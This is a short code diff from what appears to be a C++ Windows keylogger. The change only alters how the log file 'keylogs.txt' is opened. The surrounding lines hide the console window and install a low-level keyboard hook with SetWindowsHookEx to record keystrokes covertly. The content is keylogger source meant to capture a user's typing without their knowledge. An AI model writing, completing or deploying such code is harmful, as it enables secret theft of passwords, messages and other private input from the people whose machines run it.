@@ -126,8 +126,8 @@ LRESULT _stdcall HookCallBack(int nCode, WPARAM wParam, LPARAM lParam)
 
 int main()
 {
-	file.open("keylogs.txt", ios_base::app);
-	
+	file.open("keylogs.txt", ios_base::ate);
+
 	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
 
 	if (!(hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallBack, NULL, 0)))
